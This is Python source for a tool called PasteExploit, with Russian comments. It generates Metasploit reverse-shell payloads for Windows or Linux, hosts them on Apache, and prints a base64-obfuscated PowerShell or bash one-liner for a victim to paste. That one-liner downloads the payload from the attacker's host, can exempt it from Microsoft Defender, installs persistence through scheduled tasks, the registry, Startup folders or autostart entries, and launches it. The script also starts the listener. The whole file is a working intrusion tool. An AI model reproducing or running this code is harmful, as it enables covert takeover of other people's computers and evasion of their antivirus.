#!/usr/bin/python3
ThisVersion = "1.1.0"
from socket import socket, gethostbyname, gaierror, AF_INET, SOCK_DGRAM
from string import digits, ascii_lowercase, ascii_uppercase
from colorama import init, Fore, Style
from os import remove, system, getcwd
from base64 import b64encode
from pyperclip import copy
from random import choice
from sys import platform
from requests import get

# Настройка модуля colorama
init(autoreset=True)

def Windows():
	print(Fore.RED + "\n-------------------------------------------")
	print(Fore.RED + "	Выберете полезную нагрузку:")
	print(Fore.RED + "-------------------------------------------\n")

	print(" [1] windows/meterpreter/reverse_tcp")
	print(" [2] windows/meterpreter/reverse_http")
	print(" [3] windows/meterpreter/reverse_https")
	print(" [4] windows/shell/reverse_tcp")

	Payload_Choice = input("\nВыбор> ")
	if Payload_Choice == "1":
		Payload = "windows/meterpreter/reverse_tcp"
	elif Payload_Choice == "2":
		Payload = "windows/meterpreter/reverse_http"
	elif Payload_Choice == "3":
		Payload = "windows/meterpreter/reverse_https"
	elif Payload_Choice == "4":
		Payload = "windows/shell/reverse_tcp"
	else:
		print(Fore.YELLOW + "\nВыберете полезную нагрузку из списка!")
		exit()

	print(Fore.RED + "\n--------------------------------------------")
	print(Fore.RED + "	Настройка полезной нагрузки:")
	print(Fore.RED + "--------------------------------------------\n")

	# Запрос и обработка введённого IP-Адреса
	global Lhost
	Lhost = input("Введите LHOST(Стандартный: " + Local_IP + ")> ")
	if Lhost == "":
		Lhost = Local_IP
	if not CheckIP() == True:
		Error_Lhost = input("С таким IP-Адресом ваша полезная нагрузка может быть не рабочей! (Y=Продолжить, N=Сменить)> ")
		if Error_Lhost == "Y" or Error_Lhost == "y":
			pass
		elif Error_Lhost == "N" or Error_Lhost == "n":
			Lhost = input("Введите LHOST(Стандартный: " + Local_IP + ")> ")
			if Lhost == "":
				Lhost = Local_IP
		else:
			print(Fore.YELLOW + "\nВведите Продолжить(Y) или Сменить(n)")
			exit()

	# Запрос и обработка введённого порта
	Lport = input("Введите LPORT(Стандартный: 4444)> ")
	if Lport == "":
		Lport = "4444"
	if Lport.isdigit() == True:
		if Lport[0] == "0":
			print(Fore.YELLOW + "\nВведите настоящий порт!")
			exit()
	else:
		print(Fore.YELLOW + "\nВведите настоящий порт!")
		exit()

	print(Fore.RED + "\n----------------------------------------------")
	print(Fore.RED + "	Настройка вредоносной команды:")
	print(Fore.RED + "----------------------------------------------\n")
	
	# Запрос и обработка введённого пути для полезной нагрузки
	ErrorText_AddToPathFile = "Введите правильный путь где будет храниться полезная нагрузка!"
	AddToPathFile = input("Введите путь где будет храниться полезная нагрузка(Стандартный: C:\\Windows\\System32\\): ").lower()
	if AddToPathFile == "":
		AddToPathFile = "c:\\windows\\system32\\"
	if not ":" in AddToPathFile: # Проверка, что в пути есть знак ":"
		print(Fore.YELLOW + "\n" + ErrorText_AddToPathFile)
		exit()
	else:
		if not len(AddToPathFile.split(":")) == 2: # Проверка, что буква диска существует
			print(Fore.YELLOW + "\n" + ErrorText_AddToPathFile)
			exit()
		else:
			if not len(AddToPathFile.split(":")[0]) == 1: # Проверка, что буква диска один знак
				print(Fore.YELLOW + "\n" + ErrorText_AddToPathFile)
				exit()
			else:
				if not AddToPathFile.split(":")[0].isalpha() == True: # Проверка, что буква диска не цифра
					print(Fore.YELLOW + "\n" + ErrorText_AddToPathFile)
					exit()
				else:
					if not AddToPathFile[2] == "\\": # Проверка, что после буквы диска и знака ":" идёт знак "\"
						print(Fore.YELLOW + "\n" + ErrorText_AddToPathFile)
						exit()
					else:
						for i in range(7):
							if ['/', '*', '?', '"', '<', '>', '|'][i] in AddToPathFile.replace(":", "").replace("\\", ""): # Проверка, что в пути нет запрещённых в наименовании знаков
								print(Fore.YELLOW + "\n" + ErrorText_AddToPathFile)
								exit()
						else:
							if not AddToPathFile[-1] == "\\": # Проверка и добавление в конец пути знака "\"
								AddToPathFile = AddToPathFile + "\\"
							for i in range(len(AddToPathFile.rstrip("\\").split("\\"))):
								if AddToPathFile.rstrip("\\").split("\\")[i] == "": # Проверка, что в разделении категорий не используется больше одного знака "\"
									print(Fore.YELLOW + "\n" + ErrorText_AddToPathFile)
									exit()
							if AddToPathFile[-2] == "\\": # Проверка, что в конце пути только один знак "\"
								print(Fore.YELLOW + "\n" + ErrorText_AddToPathFile)
								exit()

	# Запрос и обработка введённого имя полезной нагрузки
	Name_Payload = input("Введите имя полезной нагрузки(Стандартный: dbdriver): ")
	if Name_Payload == "":
		Name_Payload = "dbdriver"
	else:
		for i in range(9):
			if ['/', ':', '*', '?', '"', "'", '<', '>', '|'][i] in Name_Payload: # Проверка, что в названии полезной нагрузки нет запрещённых в наименовании знаков
				print(Fore.YELLOW + "\nВ наименовании полезной нагрузки нельзя использовать: / : * ? \" ' < > |")
				exit()

	# Запрос и обработка добавление полезной нагрузки в исключение антивируса
	AddToException_Choice = input("Добавить полезную нагрузку в исключение антивируса(Только для: Microsoft Defender) [Y/n]> ")
	if AddToException_Choice == "Y" or AddToException_Choice == "y":
		AddToException = "add-mppreference -exclusionprocess \"" + AddToPathFile + Name_Payload + ".exe\" -ea ig;"
	elif AddToException_Choice == "N" or AddToException_Choice == "n":
		AddToException = ""
	else:
		print(Fore.YELLOW + "\nВведите Да(Y) или Нет(n)")
		exit()

	# Запрос и обработка добавление полезной нагрузки в автозагрузку
	AddToStartUp_Choice = input("Добавить полезную нагрузку в авто запуск [Y/n]> ")
	if AddToStartUp_Choice == "Y" or AddToStartUp_Choice == "y":
		print("\n [1] Планировщик заданий")
		print(" [2] Редактор реестра")
		print(" [3] Папка")
		Type_AddToStartUp = input("\nВыберите тип автозапуска полезной нагрузки> ")
		if Type_AddToStartUp == "1":
			Name_AddToStartUp = input("Введите название параметра для автозагрузки полезной нагрузки(Стандартный: " + Name_Payload + "): ")
			if Name_AddToStartUp == "":
				Name_AddToStartUp = Name_Payload
			AddToStartUp = "schtasks /create /sc onlogon /tn \"" + Name_AddToStartUp + "\" /tr \"" + AddToPathFile + Name_Payload + ".exe\" /f|out-null;"
			for i in range(8):
				if ['/', ':', '*', '?', '"', '<', '>', '|'][i] in Name_AddToStartUp: # Проверка, что в названии параметра для автозагрузки нет запрещённых в наименовании знаков
					print(Fore.YELLOW + "\nВ наименовании параметра для автозагрузки полезной нагрузки нельзя использовать: / : * ? \" < > |")
					exit()
		elif Type_AddToStartUp == "2":
			Name_AddToStartUp = input("Введите название параметра для автозагрузки полезной нагрузки(Стандартный: " + Name_Payload + "): ").replace('"', '""')
			if Name_AddToStartUp == "":
				Name_AddToStartUp = Name_Payload
			AddToStartUp = "sp hklm:software\\microsoft\\windows\\currentversion\\run \"" + Name_AddToStartUp + "\" \"" + AddToPathFile + Name_Payload + ".exe\";"
		elif Type_AddToStartUp == "3":
			Name_AddToStartUp = input("Введите название параметра для автозагрузки полезной нагрузки(Стандартный: " + Name_Payload + "): ")
			if Name_AddToStartUp == "":
				Name_AddToStartUp = Name_Payload
			AddAddToStartUp = "ni -i s -ta \"" + AddToPathFile + Name_Payload + ".exe\" -p \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + Name_AddToStartUp + "\" -f|out-null;"
			for i in range(8):
				if ['/', ':', '*', '?', '"', '<', '>', '|'][i] in Name_AddToStartUp: # Проверка, что в названии параметра для автозагрузки нет запрещённых в наименовании знаков
					print(Fore.YELLOW + "\nВ наименовании параметра для автозагрузки полезной нагрузки нельзя использовать: / : * ? \" < > |")
					exit()
		else:
			print(Fore.YELLOW + "\nВыберете тип автозапуска полезной нагрузки из списка!")
			exit()
	elif AddToStartUp_Choice == "N" or AddToStartUp_Choice == "n":
		AddToStartUp = ""
	else:
		print(Fore.YELLOW + "\nВведите Да(Y) или Нет(n)")
		exit()

	# Запрос и обработка не медленного запуска полезной нагрузки
	ImmediatelyRunPayload_Choice = input("Сразу запустить полезную нагрузку [Y/n]> ")
	if ImmediatelyRunPayload_Choice == "Y" or ImmediatelyRunPayload_Choice == "y":
		ImmediatelyRunPayload = "saps \"" + AddToPathFile + Name_Payload + ".exe\";"
	elif ImmediatelyRunPayload_Choice == "N" or ImmediatelyRunPayload_Choice == "n":
		ImmediatelyRunPayload = ""
	else:
		print(Fore.YELLOW + "\nВведите Да(Y) или Нет(n)")
		exit()

	print(Fore.RED + "\n-------------------------------------------------")
	print(Fore.RED + "	Генерируется полезная нагрузка...")
	print(Fore.RED + "-------------------------------------------------\n")

	# Создание полезной нагрузки и запуск apache сервера
	system("msfvenom -p " + Payload + " LHOST=" + Lhost + " LPORT=" + Lport + " --platform windows -a x86 -f exe -o /var/www/html/payload.exe")
	system("service apache2 restart")

	# Хеширование команды
	Shell_Command = (Random_Liters + ";try{cls;" + AddToException + "$ProgressPreference = \"SilentlyContinue\";iwr http://" + Lhost + "/payload.exe -o (ni -f \"" + AddToPathFile + Name_Payload + ".exe\");" + AddToStartUp + ImmediatelyRunPayload + "exit}catch{exit}#" + Random_Liters2).encode("UTF-16 LE")
	ShellCode_Command = b64encode(Shell_Command).decode("ASCII")

	print(Fore.RED + "\n-------------------------------")
	print(Fore.RED + "	Команда готова!")
	print(Fore.RED + "-------------------------------\n")

	Windows_Shell_Command = "powershell.exe -nop -noni -enc " + ShellCode_Command

	print("Для терминала Windows:")
	print(Fore.MAGENTA + Windows_Shell_Command + "\n")

	# Запрос и обработка копирование команды
	Clipboard_Choice = input("Копировать в буфер обмена [Y/n]> ")
	if Clipboard_Choice == "Y" or Clipboard_Choice == "y":
		copy(Windows_Shell_Command + "\n")
	elif Clipboard_Choice == "N" or Clipboard_Choice == "n":
		pass
	else:
		print(Fore.YELLOW + "\nВведите Да(Y) или Нет(n)")
		exit()

	# Запрос и обработка запуска обработчика Metasploit
	Handler_Metasploit_Choice = input("\nЗапустить обработчик Metasploit [Y/n]> ")
	if Handler_Metasploit_Choice == "Y" or Handler_Metasploit_Choice == "y":
		print(Fore.RED + "\n------------------------------------------------")
		print(Fore.RED + "	Запуск обработчика Metasploit...")
		print(Fore.RED + "------------------------------------------------\n")
		system("msfconsole -x \"use exploit/multi/handler; set PAYLOAD " + Payload + "; set LHOST " + Lhost + "; set LPORT " + Lport + "; exploit\"")
	elif Handler_Metasploit_Choice == "N" or Handler_Metasploit_Choice == "n":
		print(Fore.GREEN + "\nГотово!")
		exit()
	else:
		print(Fore.YELLOW + "\nВведите Да(Y) или Нет(n)")
		exit()

def Linux():
	print(Fore.RED + "\n-------------------------------------------")
	print(Fore.RED + "	Выберете полезную нагрузку:")
	print(Fore.RED + "-------------------------------------------\n")
	
	print(" [1] linux/x86/meterpreter/reverse_tcp")
	print(" [2] linux/x86/shell/reverse_tcp")
	print(" [3] linux/x64/shell/reverse_tcp")

	Payload_Choice = input("\nВыбор> ")
	if Payload_Choice == "1":
		Payload = "linux/x86/meterpreter/reverse_tcp"
		Arch = "x86"
	elif Payload_Choice == "2":
		Payload = "linux/x86/shell/reverse_tcp"
		Arch = "x86"
	elif Payload_Choice == "3":
		Payload = "linux/x64/shell/reverse_tcp"
		Arch = "x64"
	else:
		print(Fore.YELLOW + "\nВыберете полезную нагрузку из списка!")
		exit()

	print(Fore.RED + "\n--------------------------------------------")
	print(Fore.RED + "	Настройка полезной нагрузки:")
	print(Fore.RED + "--------------------------------------------\n")

	# Запрос и обработка введённого IP-Адреса
	global Lhost
	Lhost = input("Введите LHOST(Стандартный: " + Local_IP + ")> ")
	if Lhost == "":
		Lhost = Local_IP
	if not CheckIP() == True:
		Error_Lhost = input("С таким IP-Адресом ваша полезная нагрузка может быть не рабочей! (Y=Продолжить, N=Сменить)> ")
		if Error_Lhost == "Y" or Error_Lhost == "y":
			pass
		elif Error_Lhost == "N" or Error_Lhost == "n":
			Lhost = input("Введите LHOST(Стандартный: " + Local_IP + ")> ")
			if Lhost == "":
				Lhost = Local_IP
		else:
			print(Fore.YELLOW + "\nВведите Продолжить(Y) или Сменить(n)")
			exit()
	
	# Запрос и обработка введённого порта
	Lport = input("Введите LPORT(Стандартный: 4444)> ")
	if Lport == "":
		Lport = "4444"
	if Lport.isdigit() == True:
		if Lport[0] == "0":
			print(Fore.YELLOW + "\nВведите настоящий порт!")
			exit()
	else:
		print(Fore.YELLOW + "\nВведите настоящий порт!")
		exit()

	print(Fore.RED + "\n----------------------------------------------")
	print(Fore.RED + "	Настройка вредоносной команды:")
	print(Fore.RED + "----------------------------------------------\n")

	# Запрос и обработка введённого пути для полезной нагрузки
	ErrorText_AddToPathFile = "Введите правильный путь где будет храниться полезная нагрузка!"
	AddToPathFile = input("Введите путь где будет храниться полезная нагрузка(Стандартный: /usr/lib/): ").replace("\\", "\\\\").lower()
	if AddToPathFile == "":
		AddToPathFile = "/usr/lib/"
	if not AddToPathFile[-1] == "/": # Проверка и добавление в конец пути знака "/"
		AddToPathFile = AddToPathFile + "/"
	for i in range(len(AddToPathFile.strip("/").split("/"))):
		if AddToPathFile.strip("/").split("/")[i] == "": # Проверка, что в разделении категорий не используется больше одного знака "/"
			print(Fore.YELLOW + "\n" + ErrorText_AddToPathFile)
			exit()
	if "'" in AddToPathFile or '"' in AddToPathFile: # Проверка, что в пути нет запрещённых в наименовании знаков
		print(Fore.YELLOW + "\n" + ErrorText_AddToPathFile)
		exit()
	else:
		if AddToPathFile[-2] == "/": # Проверка, что в конце пути только один знак "/"
			print(Fore.YELLOW + "\n" + ErrorText_AddToPathFile)
			exit()
		else:
			if AddToPathFile[1] == "/": # Проверка, что в начале пути только один знак "/"
				print(Fore.YELLOW + "\n" + ErrorText_AddToPathFile)
				exit()

	# Запрос и обработка введённого имя полезной нагрузки
	Name_Payload = input("Введите имя полезной нагрузки(Стандартный: dbdriver): ")
	if Name_Payload == "":
		Name_Payload = "dbdriver"
	else:
		for i in range(2):
			if ['/', '"', "'"][i] in Name_Payload: # Проверка, что в названии полезной нагрузки нет запрещённых в наименовании знаков
				print(Fore.YELLOW + "\nВ наименовании полезной нагрузки нельзя использовать: / \" '")
				exit()

	# Запрос и обработка добавление полезной нагрузки в автозагрузку
	AddToStartUp_Choice = input("Добавить полезную нагрузку в авто запуск(Только для root пользователей) [Y/n]> ")
	if AddToStartUp_Choice == "Y" or AddToStartUp_Choice == "y":
		Name_AddToStartUp = input("Введите название параметра для автозагрузки полезной нагрузки(Стандартный: " + Name_Payload + "): ")
		if Name_AddToStartUp == "":
			Name_AddToStartUp = Name_Payload
		for i in range(2):
			if ['/', '"', "'"][i] in Name_AddToStartUp: # Проверка, что в названии параметра для автозагрузки нет запрещённых в наименовании знаков
				print(Fore.YELLOW + "\nВ наименовании полезной нагрузки нельзя использовать: / \" '")
				exit()
		AddToStartUp = "sudo mkdir -p \"/root/.config/autostart/\";sudo rm -f \"/root/.config/autostart/" + Name_AddToStartUp + ".desktop\";sudo bash -c 'echo \"[Desktop Entry]\nEncoding=UTF-8\nType=Application\nName=" + Name_AddToStartUp + "\nExec=\\\"" + AddToPathFile  + Name_Payload + ".elf\\\"\nStartupNotify=false\nTerminal=false\nHidden=false\">>\"/root/.config/autostart/" + Name_AddToStartUp + ".desktop\"';sudo chmod 777 \"/root/.config/autostart/" + Name_AddToStartUp + ".desktop\";"
	elif AddToStartUp_Choice == "N" or AddToStartUp_Choice == "n":
		AddToStartUp = ""
	else:
		print(Fore.YELLOW + "\nВведите Да(Y) или Нет(n)")
		exit()

	# Запрос и обработка не медленного запуска полезной нагрузки
	ImmediatelyRunPayload_Choice = input("Сразу запустить полезную нагрузку [Y/n]> ")
	if ImmediatelyRunPayload_Choice == "Y" or ImmediatelyRunPayload_Choice == "y":
		ImmediatelyRunPayload = "sudo \"" + AddToPathFile + Name_Payload + ".elf\"&disown;"
	elif ImmediatelyRunPayload_Choice == "N" or ImmediatelyRunPayload_Choice == "n":
		ImmediatelyRunPayload = ""
	else:
		print(Fore.YELLOW + "\nВведите Да(Y) или Нет(n)")
		exit()

	print(Fore.RED + "\n-------------------------------------------------")
	print(Fore.RED + "	Генерируется полезная нагрузка...")
	print(Fore.RED + "-------------------------------------------------\n")

	# Создание полезной нагрузки и запуск apache сервера
	system("msfvenom -p " + Payload + " LHOST=" + Lhost + " LPORT=" + Lport + " --platform linux -a " + Arch + " -f elf -o /var/www/html/payload.elf")
	system("service apache2 restart")

	# Хеширование команды
	Shell_Command = (Random_Liters + ";clear;sudo mkdir -p \"" + AddToPathFile + "\";sudo wget http://" + Lhost + "/payload.elf -O \"" + AddToPathFile + Name_Payload + ".elf\"&>/dev/null;sudo chmod 777 \"" + AddToPathFile + Name_Payload + ".elf\";" + AddToStartUp + ImmediatelyRunPayload + "exit;" + Random_Liters2).encode("ASCII")
	ShellCode_Command = b64encode(Shell_Command).decode("ASCII")

	print(Fore.RED + "\n-------------------------------")
	print(Fore.RED + "	Команда готова!")
	print(Fore.RED + "-------------------------------\n")

	Linux_Shell_Command = "echo " + ShellCode_Command + "|base64 -d|bash"

	print("Для терминала Linux:")
	print(Fore.MAGENTA + Linux_Shell_Command + "\n")

	# Запрос и обработка копирование команды
	Clipboard_Choice = input("Копировать в буфер обмена [Y/n]> ")
	if Clipboard_Choice == "Y" or Clipboard_Choice == "y":
		copy(Linux_Shell_Command)
	elif Clipboard_Choice == "N" or Clipboard_Choice == "n":
		pass
	else:
		print(Fore.YELLOW + "\nВведите Да(Y) или Нет(n)")
		exit()

	# Запрос и обработка запуска обработчика Metasploit
	Handler_Metasploit_Choice = input("\nЗапустить обработчик Metasploit [Y/n]> ")
	if Handler_Metasploit_Choice == "Y" or Handler_Metasploit_Choice == "y":
		print(Fore.RED + "\n------------------------------------------------")
		print(Fore.RED + "	Запуск обработчика Metasploit...")
		print(Fore.RED + "------------------------------------------------\n")
		system("msfconsole -x \"use exploit/multi/handler; set PAYLOAD " + Payload + "; set LHOST " + Lhost + "; set LPORT " + Lport + "; exploit\"")
	elif Handler_Metasploit_Choice == "N" or Handler_Metasploit_Choice == "n":
		print(Fore.GREEN + "\nГотово!")
		exit()
	else:
		print(Fore.YELLOW + "\nВведите Да(Y) или Нет(n)")
		exit()

# Проверка, что скрипт запускаться в линукс
if not platform == "linux":
	print(Fore.YELLOW + "Пока что нельзя запускать дынный скрипт в Windows!")
	exit()

# Проверка, интернет соединения
try:
    gethostbyname("www.google.com")
except gaierror:
	print("Проверьте подключение к сети!")
	while True:
		try:
			gethostbyname("www.google.com")
		except gaierror:
			pass
		else:
			break

# Проверка новой версии на GitHub
NewVersion = get("https://raw.githubusercontent.com/loRes228/PasteExploit/master/PasteExploit.py").text[34:39]
if ThisVersion < NewVersion:
	Install_NewVersion_Choice = input("Доступна новая версия PasteExploit v" + NewVersion + ", скачать? [Y/n]> ")
	if Install_NewVersion_Choice == "Y" or Install_NewVersion_Choice == "y":
		open(getcwd() + "/PasteExploit.py", 'w').write(get("https://raw.githubusercontent.com/loRes228/PasteExploit/master/PasteExploit.py").text)
		exec("\"" + getcwd() + "/PasteExploit.py" + "\"")
	elif Install_NewVersion_Choice == "N" or Install_NewVersion_Choice == "n":
		pass
	else:
		print(Fore.YELLOW + "\nВведите Да(Y) или Нет(n)")
		exit()

# Сбор всех IP-Адресов из ifconfig
system("ifconfig | grep \"netmask\">>/tmp/ifconfig.txt")
Ifconfig_IP = open("/tmp/ifconfig.txt", 'r').read().replace("        inet ", "").replace("  netmask ", " ").replace(" broadcast ", "").replace("\n", " ").rstrip(" ").split()
remove("/tmp/ifconfig.txt")

# Функция для проверки введённого LHOST в листе всех IP-Адресов
def CheckIP():
	for i in range(len(Ifconfig_IP)):
		if Ifconfig_IP[i] == Lhost:
			return True
	return False

# Получение локального IP-Адреса
IP_Socket = socket(AF_INET, SOCK_DGRAM)
IP_Socket.connect(("8.8.8.8", 80))
Local_IP = IP_Socket.getsockname()[0]

# Генератор случайных слов длиной четыре символа
Random_Liters = Random_Liters2 = ""
lines = digits + ascii_lowercase + ascii_uppercase
for i in range(4):
	Random_Liters += choice(lines)
	Random_Liters2 += choice(lines)

# Отчистка экрана и вывод главного банера
system("clear")
print(Fore.BLUE + "    ____             __       " + Fore.MAGENTA + "______           __      _ __ ")
print(Fore.BLUE + "   / __ \\____ ______/ /____  " + Fore.MAGENTA + "/ ____/  ______  / /___  (_) /_")
print(Fore.BLUE + "  / /_/ / __ `/ ___/ __/ _ \\" + Fore.MAGENTA + "/ __/ | |/_/ __ \\/ / __ \\/ / __/")
print(Fore.BLUE + " / ____/ /_/ (__  ) /_/  __" + Fore.MAGENTA + "/ /____>  </ /_/ / / /_/ / / /_  ")
print(Fore.BLUE + "/_/    \\__,_/____/\\__/\\___" + Fore.MAGENTA + "/_____/_/|_/ .___/_/\\____/_/\\__/ " + Style.RESET_ALL + "v" + ThisVersion)
print(Fore.BLUE + "                                    " + Fore.MAGENTA + "/_/")
print("------------------------------------------------------------------")

print(Fore.RED + "\n--------------------------------------------")
print(Fore.RED + "	Выберете систему для взлома:")
print(Fore.RED + "--------------------------------------------\n")

print(" [1] Windows")
print(" [2] Linux")

OS_Choice = input("\nВыбор> ")

if OS_Choice == "1":
	Windows()
elif OS_Choice == "2":
	Linux()
else:
	print(Fore.YELLOW + "\nВыберете OS из списка!")
	exit()